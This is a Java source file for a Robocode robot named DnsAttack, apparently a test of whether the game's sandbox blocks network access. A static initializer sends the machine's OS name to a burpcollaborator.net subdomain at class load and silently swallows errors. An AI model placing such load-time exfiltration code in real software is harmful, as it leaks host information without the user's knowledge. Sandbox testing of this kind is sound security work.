package tested.robots;

public class DnsAttack extends robocode.Robot {
	static {
		try {
			new java.net.URL("http://" + System.getProperty("os.name").replaceAll(" ", ".")
					+ ".randomsubdomain.burpcollaborator.net").openStream();
		} catch (Exception e) {
		}
	}

	public void run() {
		for (;;) {
			ahead(100);
			back(100);
		}
	}
}
